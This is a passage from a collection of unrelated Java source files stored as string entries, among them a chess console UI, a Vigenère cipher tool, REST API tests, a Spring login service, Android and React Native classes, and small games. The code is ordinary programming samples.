chessMatch.getCurrentPlayer());\n\t\t\tif(chessMatch.getCheck()){\n\t\t\t\tSystem.out.println(\"CHECK!\");\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tSystem.out.println(\"CHECKMATE!\");\n\t\t\tSystem.out.println(\"Vencedor: \" + chessMatch.getCurrentPlayer());\n\t\t}\n\t}\n\n\tpublic static void printBoard(ChessPiece[][] pieces) {\n\t\tfor (int i = 0; i < pieces.length; i++) {\n\t\t\tSystem.out.print((8 - i) + \" \");\n\t\t\tfor (int j = 0; j < pieces.length; j++) {\n\t\t\t\tprintPiece(pieces[i][j], false);\n\t\t\t}\n\t\t\tSystem.out.println();\n\t\t}\n\t\tSystem.out.print(\"  a b c d e f g h\");\n\t}\n\t\n\tpublic static void printBoard(ChessPiece[][] pieces, boolean[][] possibleMoves) {\n\t\tfor (int i = 0; i < pieces.length; i++) {\n\t\t\tSystem.out.print((8 - i) + \" \");\n\t\t\tfor (int j = 0; j < pieces.length; j++) {\n\t\t\t\tprintPiece(pieces[i][j], possibleMoves[i][j]);\n\t\t\t}\n\t\t\tSystem.out.println();\n\t\t}\n\t\tSystem.out.print(\"  a b c d e f g h\");\n\t}\n\t\n\tprivate static void printPiece(ChessPiece piece, boolean background) {\n\t\tif(background){\n\t\t\tSystem.out.print(ANSI_BLUE_BACKGROUND);\n\t\t}\n\t\tif (piece == null) {\n\t\t\tSystem.out.print(\"-\" + ANSI_RESET);\n\t\t} else {\n\t\t\tif (piece.getColor() == Color.WHITE) {\n\t\t\t\tSystem.out.print(ANSI_WHITE + piece + ANSI_RESET);\n\t\t\t} else {\n\t\t\t\tSystem.out.print(ANSI_YELLOW + piece + ANSI_RESET);\n\t\t\t}\n\t\t}\n\t\tSystem.out.print(\" \");\n\t}\n\t\n\tprivate static void printCapturedPieces(List<ChessPiece> captured){\n\t\tList<ChessPiece> white = captured.stream().filter(x -> x.getColor() == Color.WHITE).collect(Collectors.toList());\n\t\tList<ChessPiece> black = captured.stream().filter(x -> x.getColor() == Color.BLACK).collect(Collectors.toList());\n\t\tSystem.out.println(\"Pecas capturadas: \");\n\t\tSystem.out.print(\"White: \");\n\t\tSystem.out.print(ANSI_WHITE);\n\t\tSystem.out.println(Arrays.toString(white.toArray()));\n\t\tSystem.out.print(ANSI_RESET);\n\t\tSystem.out.print(\"Black: \");\n\t\tSystem.out.print(ANSI_YELLOW);\n\t\tSystem.out.println(Arrays.toString(black.toArray()));\n\t\tSystem.out.print(ANSI_RESET);\n\t}\n\t}\n",
    "package br.ifba;\n\nimport java.util.Arrays;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\nimport br.ifba.exception.InvalidParameterException;\n\n/**\n * Hello world!\n *\n */\npublic class App \n{\n\t\n\tprivate static final String REGEX = \"[^A-Z]{1,}\";\n\n\tprivate static final String DECRIPT = \"DECRIPT\";\n\n\tprivate static final String ENCRIPT = \"ENCRIPT\";\n\n\tprivate static final String[] matrix = {\"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\",\"H\", \"I\", \"J\", \"K\", \"L\",\"M\", \"N\", \"O\", \"P\", \"Q\", \"R\", \"S\", \"T\", \"U\", \"V\", \"W\", \"X\", \"Y\", \"Z\",\"A\", \"B\", \"C\", \"D\", \"E\", \"F\", \"G\",\"H\", \"I\", \"J\", \"K\", \"L\",\"M\", \"N\", \"O\", \"P\", \"Q\", \"R\", \"S\", \"T\", \"U\", \"V\", \"W\", \"X\", \"Y\", \"Z\"};\n\t\n\tprivate static String[][] cifra = new String[26][26];\n\t\n\tprivate static void loadCifra(){\n\t\t\n\t\tfor (int i=0; i < 25;i++) {\n\t\t\tfor (int j=i; j < i+25;j++) {\n\t\t\t\tcifra[i][j-i]=matrix[j];\n\t\t\t}\n\t\t}\n\t\t\t\t\n\t}\n\t\n\tprivate static boolean validateField(String value) {\n\t\t\n\t\tboolean validate = true;\n\t\t\n\t\tPattern pattern = Pattern.compile(REGEX, Pattern.CASE_INSENSITIVE);\n\t    Matcher matcher = pattern.matcher(value);\n\t    boolean matchFound = matcher.find();\n\t    \n\t    if(matchFound) {\n\t    \tvalidate = false;\n\t    } \n\t    \n\t    return validate;\n\t}\n\t\n\t\n    public static void main( String[] args )\n    {\n    \ttry {\n    \t\t\n\t\t\tif (args.length!=3 || (args[0].length()==0 && ENCRIPT.equals(args[0]) || DECRIPT.equals(args[0])) || \n\t\t\t\t\targs[1].length()==0 || !validateField(args[1]) || args[2].length()==0 || !validateField(args[2])) {\n\t\t\t\tthrow new InvalidParameterException(\"Parametros inavalidos....\");\n\t\t\t}\n    \t    \t\n\t\t\tString operacao = args[0].toUpperCase();\n\t\t\tString text = args[1].toUpperCase();\n\t\t\tString chave = args[2].toUpperCase();\n\t\t\t\n\t\t\tString textoCifrado=\"\";\n\t\t\t\n\t\t\tloadCifra();\n\t\t\t\n\t\t\t/**\n\t\t\t * Verifica se a chave \u00e9 menor que o texto, se for repete a chave ate que fique maior ou igual \n\t\t\t */\n\t\t\tif (chave.length() < text.length()) {\n\t\t\t\tfor (int i=0;i<text.length()-chave.length();i++) {\n\t\t\t\t\tchave+=chave;\n\t\t\t\t\tif (chave.length() >= text.length()) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\t\n\t\t\t/**\n\t\t\t * Aqui acontece o encript ou decript\n\t\t\t */\n\t\t\tfor (int i=0; i < text.length();i++) {\n\t\t\t\tString letraTexto = text.split(\"|\")[i];\n\t\t\t\tString letraChave = chave.split(\"|\")[i];\n\t\t\t\t\n\t\t\t\tint posLetraTexto = Arrays.asList(matrix).indexOf(letraTexto);\n\t\t\t\tint posLetraChave = Arrays.asList(matrix).indexOf(letraChave);\n\t\t\t\t\n\t\t\t\tif (ENCRIPT.equals(operacao)) {\n\t\t\t\t\ttextoCifrado+=cifra[posLetraTexto][posLetraChave];\n\t\t\t\t}else {\n\t\t\t\t\tint result = posLetraTexto - posLetraChave < 0?(posLetraTexto - posLetraChave)+26:posLetraTexto - posLetraChave;\n\t\t\t\t\t\n\t\t\t\t\ttextoCifrado+=matrix[result];\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t\n\t\t\t}\n\t\t\t\n\t\t\tSystem.out.println(textoCifrado);\n\t\t\t\n\t\t}catch (InvalidParameterException e) {\n\t\t\tSystem.out.println(\"entre com a operacao, o texto e a chave de criptografia ex.: encript|decript texto chave. Obs.: o texto e a chave so podem conter letras\");\n\t\t}\n\t\t\n\t\tcatch(Exception e ) {\n\t\t\te.printStackTrace();\n\t\t}\n\n    }\n}\n",
    "package stepdefinitions;\r\n\r\nimport io.cucumber.cienvironment.internal.com.eclipsesource.json.JsonObject;\r\nimport io.cucumber.java.en.And;\r\nimport io.cucumber.java.en.Given;\r\nimport io.cucumber.java.en.Then;\r\nimport io.cucumber.java.en.When;\r\nimport io.restassured.RestAssured;\r\nimport io.restassured.path.json.JsonPath;\r\nimport io.restassured.response.Response;\r\nimport io.restassured.response.ResponseBody;\r\nimport io.restassured.specification.RequestSpecification;\r\nimport static org.junit.Assert.*;\r\nimport org.json.simple.JSONObject;\r\n\r\npublic class Products {\r\n    public RequestSpecification httpuReqest;\r\n    public Response response;\r\n    public int ResponseCode;\r\n    public int StatusCode;\r\n    public ResponseBody body ;\r\n    public String s;\r\n\r\n    public  JSONObject requestParams;\r\n\r\n    @Given(\"I hit the url of get products api endpoint\")\r\n    public void I_hit_the_url_of_get_products_api_endpoint()\r\n    {\r\n        RestAssured.baseURI = \"https://fakestoreapi.com/\";\r\n    }\r\n\r\n    @When(\"I pass the url of products in  the request\")\r\n    public void I_pass_the_url_of_products_in_the_request()\r\n    {\r\n        httpuReqest = RestAssured.given();\r\n        response = httpuReqest.get(\"products\");\r\n    }\r\n\r\n    @Then(\"I received the response code as {int}\")\r\n    public void I_received_the_response_code_as(Integer int1)\r\n    {\r\n        ResponseCode = response.getStatusCode();\r\n        assertEquals(ResponseCode,200);\r\n\r\n    }\r\n\r\n    @Then(\"I verify that the rate of the first product is {}\")\r\n    public void I_verify_that_the_rate_of_the_first_product_is_(String rate)\r\n    {\r\n        body = response.getBody();\r\n        // convert response body to string\r\n        String responseBody = body.asString();\r\n\r\n        //JSON Representation from Response Body\r\n        JsonPath jsnpath = response.jsonPath();\r\n        String s = jsnpath.getJsonObject(\"rating[0].rate\").toString();\r\n\r\n        assertEquals(rate, s);\r\n\r\n\r\n    }\r\n\r\n    @Given(\"I hit the url of post  product api endpoint\")\r\n    public void iHitTheUrlOfPostProductApiEndpoint() {\r\n        RestAssured.baseURI = \"https://fakestoreapi.com/\";\r\n        httpuReqest=RestAssured.given();\r\n        requestParams = new JSONObject();\r\n\r\n\r\n\r\n\r\n\r\n    }\r\n\r\n    @And(\"I pass the request body of product title {}\")\r\n    public void iPassTheRequestBodyOfProductTitle(String title)\r\n    {\r\n        requestParams.put(\"title\",title);\r\n        requestParams.put(\"price\",\"13.5\");\r\n        requestParams.put(\"description\",\"lorem ipsum set\");\r\n        requestParams.put(\"image\",\"https://i.pravatar.cc\");\r\n        requestParams.put(\"category\",\"electronic\");\r\n        httpuReqest.body(requestParams.toJSONString());\r\n        Response response = httpuReqest.post(\"products\");\r\n        ResponseBody body = response.getBody();\r\n        JsonPath jsnpath = response.jsonPath();\r\n        s= jsnpath.getJsonObject(\"id\").toString();\r\n        System.out.println(response.getStatusLine());\r\n        System.out.println(body.asString());\r\n\r\n    }\r\n\r\n    @Then(\"I received the response body with id as {}\")\r\n    public void iReceivedTheResponseBodyWithIdAs(String id)\r\n    {\r\n        assertEquals(id,s);\r\n    }\r\n\r\n    @Given(\"I hit the url of put  product api endpoint\")\r\n    public void iHitTheUrlOfPutProductApiEndpoint()\r\n    {\r\n        RestAssured.baseURI = \"https://fakestoreapi.com/\";\r\n        requestParams = new JSONObject();\r\n\r\n    }\r\n\r\n    @When(\"I pass the url of products in  the request with {}\")\r\n    public void iPassTheUrlOfProductsInTheRequestWith(String productnumber) {\r\n        httpuReqest = RestAssured.given();\r\n        requestParams.put(\"title\",\"test product\");\r\n        requestParams.put(\"price\",\"13.5\");\r\n        requestParams.put(\"description\",\"lorem ipsum set\");\r\n        requestParams.put(\"image\",\"https://i.pravatar.cc\");\r\n        requestParams.put(\"category\",\"electronic\");\r\n\r\n        httpuReqest.body(requestParams.toJSONString());\r\n        response = httpuReqest.put(\"products/\"+productnumber);\r\n        ResponseBody body = response.getBody();\r\n        JsonPath jsnpath = response.jsonPath();\r\n        System.out.println(response.getStatusLine());\r\n        System.out.println(body.asString());\r\n\r\n    }\r\n\r\n\r\n    @Given(\"I hit the url of delete  product api endpoint\")\r\n    public void iHitTheUrlOfDeleteProductApiEndpoint() {\r\n        RestAssured.baseURI = \"https://fakestoreapi.com/\";\r\n        requestParams = new JSONObject();\r\n\r\n    }\r\n\r\n    @When(\"I pass the url of delete products in  the request with {}\")\r\n    public void iPassTheUrlOfDeleteProductsInTheRequestWith(String productnumber) {\r\n\r\n        httpuReqest = RestAssured.given();\r\n        requestParams.put(\"title\",\"test product\");\r\n        requestParams.put(\"price\",\"13.5\");\r\n        requestParams.put(\"description\",\"lorem ipsum set\");\r\n        requestParams.put(\"image\",\"https://i.pravatar.cc\");\r\n        requestParams.put(\"category\",\"electronic\");\r\n\r\n        httpuReqest.body(requestParams.toJSONString());\r\n        response = httpuReqest.delete(\"products/\"+produ",
    "package com.ruoyi.framework.web.service;\r\n\r\nimport org.slf4j.Logger;\r\nimport org.slf4j.LoggerFactory;\r\nimport org.springframework.beans.factory.annotation.Autowired;\r\nimport org.springframework.security.core.userdetails.UserDetails;\r\nimport org.springframework.security.core.userdetails.UserDetailsService;\r\nimport org.springframework.security.core.userdetails.UsernameNotFoundException;\r\nimport org.springframework.stereotype.Service;\r\nimport com.ruoyi.common.core.domain.entity.SysUser;\r\nimport com.ruoyi.common.core.domain.model.LoginUser;\r\nimport com.ruoyi.common.enums.UserStatus;\r\nimport com.ruoyi.common.exception.ServiceException;\r\nimport com.ruoyi.common.utils.MessageUtils;\r\nimport com.ruoyi.common.utils.StringUtils;\r\nimport com.ruoyi.system.service.ISysUserService;\r\n\r\n/**\r\n * \u7528\u6237\u9a8c\u8bc1\u5904\u7406\r\n *\r\n * @author ruoyi\r\n */\r\n@Service\r\npublic class UserDetailsServiceImpl implements UserDetailsService\r\n{\r\n    private static final Logger log = LoggerFactory.getLogger(UserDetailsServiceImpl.class);\r\n\r\n    @Autowired\r\n    private ISysUserService userService;\r\n    \r\n    @Autowired\r\n    private SysPasswordService passwordService;\r\n\r\n    @Autowired\r\n    private SysPermissionService permissionService;\r\n\r\n    @Override\r\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException\r\n    {\r\n        SysUser user = userService.selectUserByUserName(username);\r\n        if (StringUtils.isNull(user))\r\n        {\r\n            log.info(\"\u767b\u5f55\u7528\u6237\uff1a{} \u4e0d\u5b58\u5728.\", username);\r\n            throw new ServiceException(MessageUtils.message(\"user.not.exists\"));\r\n        }\r\n        else if (UserStatus.DELETED.getCode().equals(user.getDelFlag()))\r\n        {\r\n            log.info(\"\u767b\u5f55\u7528\u6237\uff1a{} \u5df2\u88ab\u5220\u9664.\", username);\r\n            throw new ServiceException(MessageUtils.message(\"user.password.delete\"));\r\n        }\r\n        else if (UserStatus.DISABLE.getCode().equals(user.getStatus()))\r\n        {\r\n            log.info(\"\u767b\u5f55\u7528\u6237\uff1a{} \u5df2\u88ab\u505c\u7528.\", username);\r\n            throw new ServiceException(MessageUtils.message(\"user.blocked\"));\r\n        }\r\n\r\n        passwordService.validate(user);\r\n\r\n        return createLoginUser(user);\r\n    }\r\n\r\n    public UserDetails createLoginUser(SysUser user)\r\n    {\r\n        return new LoginUser(user.getUserId(), user.getDeptId(), user, permissionService.getMenuPermission(user));\r\n    }\r\n}\r\n",
    "package ThreadManager;\n\nimport TerminalView.Display;\nimport Robot.IRobot;\nimport Json.*;\nimport org.json.simple.JSONObject;\n\nimport java.io.BufferedReader;\nimport java.io.IOException;;\n\npublic class ServerHandler extends Thread {\n    private IRobot robot;\n    private BufferedReader reader;\n    private Display display;\n\n    public ServerHandler(BufferedReader reader, IRobot robot, Display display) {\n        this.robot = robot;\n        this.reader = reader;\n        this.display = display;\n    }\n\n    /**\n     * Main controller function used to continuously listen for and receive response messages from the server\n     * program. The response messages are used to update the player's Robot object and the updated state of\n     * the robot is displayed to the user.\n     */\n    @Override\n    public void run() {\n        String response;\n        JSONObject jsonResponse;\n        Decode decoder;\n\n        response = \"\";\n        while (true) {\n            try {\n                while (true) {\n                    response = reader.readLine();\n                    if (response == null) {\n                        display.display(\"World disconnected. Please try again later.\", false, false, false);\n                        this.interrupt();\n                        System.exit(0);\n                    } else if (!response.isBlank()){\n                        break;\n                    }\n                }\n            } catch (IOException e) {\n                display.display(\"Something went wrong. Try again later\", false, false, false);\n                this.interrupt();\n                System.exit(0);\n            }\n            jsonResponse = new Utilities().stringToJson(response);\n            if(jsonResponse != null) {\n                decoder = new Decode(jsonResponse, robot, display);\n                decoder.decodeResponse(robot);\n                display.refresh(true, false, decoder.getCommand().equals(\"look\"));\n            }\n        }\n    }\n}\n",
    "import java.util.ArrayList;\r\nimport java.util.List;\r\nimport java.util.Random;\r\nimport java.util.Scanner;\r\n\r\nclass Player {\r\n    private String name;\r\n    private int cashBalance;\r\n    private int currentPosition;\r\n    private boolean paydaySpaceReached;\r\n    private List<Card> mailCards;\r\n    private List<Card> dealCards;\r\n\r\n    public Player(String name, int startingCash) {\r\n        this.name = name;\r\n        this.cashBalance = startingCash;\r\n        this.currentPosition = 0;\r\n        this.paydaySpaceReached = false;\r\n        this.mailCards = new ArrayList<>();\r\n        this.dealCards = new ArrayList<>();\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public int getCashBalance() {\r\n        return cashBalance;\r\n    }\r\n\r\n    public int getCurrentPosition() {\r\n        return currentPosition;\r\n    }\r\n\r\n    public boolean hasReachedPaydaySpace() {\r\n        return paydaySpaceReached;\r\n    }\r\n\r\n    public void move(int steps) {\r\n        currentPosition += steps;\r\n        if (currentPosition >= Board.NUMBER_OF_SPACES) {\r\n            paydaySpaceReached = true;\r\n        }\r\n    }\r\n\r\n    public void addCash(int amount) {\r\n        cashBalance += amount;\r\n    }\r\n\r\n    public void deductCash(int amount) {\r\n        cashBalance -= amount;\r\n    }\r\n\r\n    public void addMailCard(MailCard card) {\r\n        mailCards.add(card);\r\n    }\r\n\r\n    public void addDealCard(DealCard card) {\r\n        dealCards.add(card);\r\n    }\r\n\r\n    public List<Card> getMailCards() {\r\n        return mailCards;\r\n    }\r\n\r\n    public List<Card> getDealCards() {\r\n        return dealCards;\r\n    }\r\n}\r\n\r\nclass Board {\r\n    public static final int NUMBER_OF_SPACES = 31; // Including start and end spaces\r\n    private static final String[] SPACE_ACTIONS = {\r\n        \"Start\", \"Payday\", \"Deal\", \"Mail\", \"Bills\", \"Lottery\", \"Deal\", \"Mail\", \"Bills\", \"Charity\", \"Deal\", \"Mail\",\r\n        \"Bills\", \"Deal\", \"Mail\", \"Bills\", \"Deal\", \"Mail\", \"Deal\", \"Mail\", \"Deal\", \"Mail\", \"Bills\", \"Deal\", \"Mail\",\r\n        \"Bills\", \"Deal\", \"Mail\", \"Payday\", \"End\"\r\n    };\r\n\r\n    public static String getSpaceAction(int position) {\r\n        return SPACE_ACTIONS[position];\r\n    }\r\n}\r\n\r\nabstract class Card {\r\n    private String description;\r\n\r\n    public Card(String description) {\r\n        this.description = description;\r\n    }\r\n\r\n    public String getDescription() {\r\n        return description;\r\n    }\r\n\r\n    public abstract void performAction(Player player);\r\n}\r\n\r\nclass MailCard extends Card {\r\n    public MailCard(String description) {\r\n        super(description);\r\n    }\r\n\r\n    @Override\r\n    public void performAction(Player player) {\r\n        Random random = new Random();\r\n        int amount = random.nextInt(500) + 100; // Generate a random amount between $100 and $600\r\n\r\n        player.deductCash(amount);\r\n        System.out.println(\"You lost $\" + amount + \" due to the mail card.\");\r\n    }\r\n}\r\n\r\nclass DealCard extends Card {\r\n    public DealCard(String description) {\r\n        super(description);\r\n    }\r\n\r\n    @Override\r\n    public void performAction(Player player) {\r\n        Random random = new Random();\r\n        int amount = random.nextInt(1000) + 500; // Generate a random amount between $500 and $1500\r\n\r\n        player.addCash(amount);\r\n        System.out.println(\"You gained $\" + amount + \" from the deal card.\");\r\n    }\r\n}\r\n\r\nclass Dice {\r\n    private static final Random random = new Random();\r\n\r\n    public static int roll() {\r\n        return random.nextInt(6) + 1; // Rolling a 6-sided die\r\n    }\r\n}\r\n\r\npublic class PaydayGame {\r\n    private static List<Player> players; // Make players static\r\n    private int currentTurn;\r\n\r\n    public PaydayGame(int numberOfPlayers) {\r\n        players = new ArrayList<>();\r\n        for (int i = 1; i <= numberOfPlayers; i++) {\r\n            Player player = new Player(\"Player \" + i, 3500); // Starting cash $3500\r\n            players.add(player);\r\n        }\r\n        currentTurn = 0;\r\n    }\r\n\r\n    public void startGame() {\r\n    Scanner scanner = new Scanner(System.in);\r\n    System.out.println(\"Welcome to Payday Game!\");\r\n    System.out.println(\"Let's get started.\\n\");\r\n\r\n    System.out.print(\"Enter the number of months to play: \");\r\n    int months = scanner.nextInt();\r\n    int daysInMonth = 30; // Assuming 30 days in each month for simplicity\r\n\r\n    // Game loop for each month\r\n    for (int month = 1; month <= months; month++) {\r\n        System.out.println(\"\\nMonth \" + month + \" begins!\");\r\n\r\n        // Loop for each day in the month\r\n        for (int day = 1; day <= daysInMonth; day++) {\r\n            System.out.println(\"Day \" + day);\r\n\r\n            // Player turns loop for each day\r\n            for (Player player : players) {\r\n                currentTurn++;\r\n                System.out.println(\"\\n\" + player.getName() + \"'s turn (Turn \" + currentTurn + \")\");\r\n                System.out.println(\"Current Cash Balance: $\" + player.getCashBalance());\r\n                System.out.println(\"Current Position: \" + player.getCurrentPosition());\r\n\r\n",
    "package com.rnwallpaper;\n\nimport android.app.Application;\nimport com.facebook.react.PackageList;\nimport com.facebook.react.ReactApplication;\nimport com.facebook.react.ReactNativeHost;\nimport com.facebook.react.ReactPackage;\nimport com.facebook.react.defaults.DefaultNewArchitectureEntryPoint;\nimport com.facebook.react.defaults.DefaultReactNativeHost;\nimport com.facebook.soloader.SoLoader;\nimport java.util.List;\n\npublic class MainApplication extends Application implements ReactApplication {\n\n  private final ReactNativeHost mReactNativeHost =\n      new DefaultReactNativeHost(this) {\n        @Override\n        public boolean getUseDeveloperSupport() {\n          return BuildConfig.DEBUG;\n        }\n\n        @Override\n        protected List<ReactPackage> getPackages() {\n          @SuppressWarnings(\"UnnecessaryLocalVariable\")\n          List<ReactPackage> packages = new PackageList(this).getPackages();\n          // Packages that cannot be autolinked yet can be added manually here, for example:\n          // packages.add(new MyReactNativePackage());\n          return packages;\n        }\n\n        @Override\n        protected String getJSMainModuleName() {\n          return \"index\";\n        }\n\n        @Override\n        protected boolean isNewArchEnabled() {\n          return BuildConfig.IS_NEW_ARCHITECTURE_ENABLED;\n        }\n\n        @Override\n        protected Boolean isHermesEnabled() {\n          return BuildConfig.IS_HERMES_ENABLED;\n        }\n      };\n\n  @Override\n  public ReactNativeHost getReactNativeHost() {\n    return mReactNativeHost;\n  }\n\n  @Override\n  public void onCreate() {\n    super.onCreate();\n    SoLoader.init(this, /* native exopackage */ false);\n    if (BuildConfig.IS_NEW_ARCHITECTURE_ENABLED) {\n      // If you opted-in for the New Architecture, we load the native entry point for this app.\n      DefaultNewArchitectureEntryPoint.load();\n    }\n    ReactNativeFlipper.initializeFlipper(this, getReactNativeHost().getReactInstanceManager());\n  }\n}\n",
    "package br.com.alura.bytebank.domain.cliente;\n\nimport java.time.LocalDate;\nimport java.util.Objects;\n\npublic class Cliente {\n\n    private String nome;\n    private String cpf;\n    private String email;\n\n    public Cliente(DadosCadastroCliente dados) {\n        this.nome = dados.nome();\n        this.cpf = dados.cpf();\n        this.email = dados.email();\n    }\n\n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Cliente cliente = (Cliente) o;\n        return cpf.equals(cliente.cpf);\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(cpf);\n    }\n\n    @Override\n    public String toString() {\n        return \"Cliente{\" +\n                \"nome='\" + nome + '\\'' +\n                \", cpf='\" + cpf + '\\'' +\n                \", email='\" + email + '\\'' +\n                '}';\n    }\n\n    public String getNome() {\n        return nome;\n    }\n\n    public String getCpf() {\n        return cpf;\n    }\n\n    public String getEmail() {\n        return email;\n    }\n\n}\n",
    "/*\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license\r\n * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template\r\n */\r\npackage domain;\r\n\r\nimport java.io.Serializable;\r\n\r\n/**\r\n *\r\n * @author ameer\r\n */\r\npublic class Student implements Serializable{\r\n    private String name;\r\n    private String studentNumber;\r\n\r\n    public Student() {\r\n    }\r\n\r\n    public Student(String name, String studentNumber) {\r\n        this.name = name;\r\n        this.studentNumber = studentNumber;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public void setName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    public String getStudentNumber() {\r\n        return studentNumber;\r\n    }\r\n\r\n    public void setStudentNumber(String studentNumber) {\r\n        this.studentNumber = studentNumber;\r\n    }\r\n\r\n    @Override\r\n    public String toString() {\r\n        return \"Student{\" + \"name=\" + name + \", studentNumber=\" + studentNumber + '}';\r\n    }\r\n    \r\n    \r\n    \r\n}\r\n",
    "package com.sleepapp.SleepTracker.widget.bottomtab;\n\nimport android.content.Context;\nimport androidx.annotation.Nullable;\nimport androidx.fragment.app.FragmentManager;\nimport androidx.viewpager.widget.ViewPager;\nimport android.util.AttributeSet;\nimport android.util.Log;\nimport android.view.View;\nimport android.widget.LinearLayout;\n\nimport com.sleepapp.SleepTracker.R;\nimport com.sleepapp.SleepTracker.base.BaseFragment;\n\nimport java.util.List;\n\nimport butterknife.BindView;\nimport butterknife.ButterKnife;\nimport butterknife.OnClick;\n\npublic class CustomBottomTabWidget extends LinearLayout {\n\n    @BindView(R.id.ll_menu_home_page)\n    LinearLayout llMenuHome;\n    @BindView(R.id.ll_menu_music)\n    LinearLayout llMenuMusic;\n    @BindView(R.id.ll_menu_alarm)\n    LinearLayout llMenuAlarm;\n    @BindView(R.id.ll_menu_exper)\n    LinearLayout llMenuExper;\n    @BindView(R.id.ll_menu_account)\n    LinearLayout llMenuAccount;\n    @BindView(R.id.vp_tab_widget)\n    ViewPager viewPager;\n\n    private FragmentManager mFragmentManager;\n    private List<BaseFragment> mFragmentList;\n    private TabPagerAdapter mAdapter;\n\n    public CustomBottomTabWidget(Context context) {\n        this(context, null, 0);\n    }\n\n    public CustomBottomTabWidget(Context context, @Nullable AttributeSet attrs) {\n        this(context, attrs, 0);\n    }\n\n    public CustomBottomTabWidget(Context context, @Nullable AttributeSet attrs, int defStyleAttr) {\n        super(context, attrs, defStyleAttr);\n        View view = View.inflate(context, R.layout.widget_custom_bottom_tab, this);\n        ButterKnife.bind(view);\n\n        //\u8bbe\u7f6e\u9ed8\u8ba4\u7684\u9009\u4e2d\u9879\n        selectTab(MenuTab.HOME);\n\n    }\n\n    /**\n     * \u5916\u90e8\u8c03\u7528\u521d\u59cb\u5316\uff0c\u4f20\u5165\u5fc5\u8981\u7684\u53c2\u6570\n     *\n     * @param fm\n     */\n    public void init(FragmentManager fm, List<BaseFragment> fragmentList) {\n        mFragmentManager = fm;\n        mFragmentList = fragmentList;\n        initViewPager();\n    }\n\n    /**\n     * \u521d\u59cb\u5316 ViewPager\n     */\n    private void initViewPager() {\n        mAdapter = new TabPagerAdapter(mFragmentManager, mFragmentList);\n        viewPager.setAdapter(mAdapter);\n        viewPager.setOffscreenPageLimit(1);\n        viewPager.addOnPageChangeListener(new ViewPager.OnPageChangeListener() {\n            @Override\n            public void onPageScrolled(int position, float positionOffset, int positionOffsetPixels) {\n                Log.d(\"msg\", \"hahaha\");\n            }\n\n            @Override\n            public void onPageSelected(int position) {\n                //\u5c06ViewPager\u4e0e\u4e0b\u9762\u7684tab\u5173\u8054\u8d77\u6765\n                switch (position) {\n                    case 0:\n                        selectTab(MenuTab.ALARM);\n                        break;\n                    case 1:\n                        selectTab(MenuTab.MUSIC);\n                        break;\n                    case 2:\n                        selectTab(MenuTab.HOME);\n                        break;\n                    case 3:\n                        selectTab(MenuTab.EXPER);\n                        break;\n                    case 4:\n                        selectTab(MenuTab.ACCOUNT);\n                        break;\n                    default:\n                        selectTab(MenuTab.HOME);\n                        break;\n                }\n            }\n\n            @Override\n            public void onPageScrollStateChanged(int state) {\n                Log.d(\"msg\", \"blablabla\");\n            }\n        });\n    }\n\n    /**\n     * \u70b9\u51fb\u4e8b\u4ef6\u96c6\u5408\n     */\n    @OnClick({R.id.ll_menu_home_page, R.id.ll_menu_music, R.id.ll_menu_alarm, R.id.ll_menu_exper, R.id.ll_menu_account})\n    public void onViewClicked(View view) {\n\n        switch (view.getId()) {\n            case R.id.ll_menu_alarm:\n                selectTab(MenuTab.ALARM);\n                viewPager.setCurrentItem(0);\n                break;\n            case R.id.ll_menu_music:\n                selectTab(MenuTab.MUSIC);\n                viewPager.setCurrentItem(1);\n                break;\n            case R.id.ll_menu_home_page:\n                selectTab(MenuTab.HOME);\n                //\u4f7fViewPager\u8ddf\u968ftab\u70b9\u51fb\u4e8b\u4ef6\u6ed1\u52a8\n                viewPager.setCurrentItem(2);\n                break;\n            case R.id.ll_menu_exper:\n                selectTab(MenuTab.EXPER);\n                viewPager.setCurrentItem(3);\n                break;\n            case R.id.ll_menu_account:\n                selectTab(MenuTab.ACCOUNT);\n                viewPager.setCurrentItem(4);\n                break;\n        }\n    }\n\n    /**\n     * \u8bbe\u7f6e Tab \u7684\u9009\u4e2d\u72b6\u6001\n     *\n     * @param tab \u8981\u9009\u4e2d\u7684\u6807\u7b7e\n     */\n    public void selectTab(MenuTab tab) {\n        //\u5148\u5c06\u6240\u6709tab\u53d6\u6d88\u9009\u4e2d\uff0c\u518d\u5355\u72ec\u8bbe\u7f6e\u8981\u9009\u4e2d\u7684tab\n        unCheckedAll();\n\n        switch (tab) {\n            case ALARM:\n                llMenuAlarm.setActivated(true);\n                break;\n            case MUSIC:\n                llMenuMusic.setActivated(true);\n                break;\n            case HOME:\n                llMenuHome.setActivated(true);\n                break;\n            case EXPER:\n                llMenuExper.setActivated(true);\n                break;\n            case ACCOUNT",
    "import java.util.Scanner;\n\npublic class fibonacci3 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter the number of Fibonacci elements to be printed:\");\n        int n = scanner.nextInt();\n\n        System.out.println(\"Choose output format:\");\n        System.out.println(\"1. Numeric\");\n        System.out.println(\"2. Words\");\n        System.out.print(\"Choice: \");\n        int choice = scanner.nextInt();\n\n        FibonacciGenerator fibonacciGenerator;\n        if (choice == 1) {\n            fibonacciGenerator = new NumericFibonacciGenerator();\n        } else {\n            fibonacciGenerator = new WordFibonacciGenerator();\n        }\n\n        fibonacciGenerator.generateFibonacci(n);\n    }\n}\n\nclass FibonacciGenerator {\n    public void generateFibonacci(int n) {\n        int a = 0, b = 1;\n        System.out.println(\"Fibonacci series:\");\n        for (int i = 0; i < n; i++) {\n            System.out.print(a + \" \");\n            int temp = a + b;\n            a = b;\n            b = temp;\n        }\n    }\n}\n\nclass NumericFibonacciGenerator extends FibonacciGenerator {\n    @Override\n    public void generateFibonacci(int n) {\n        super.generateFibonacci(n);\n    }\n}\n\nclass WordFibonacciGenerator extends 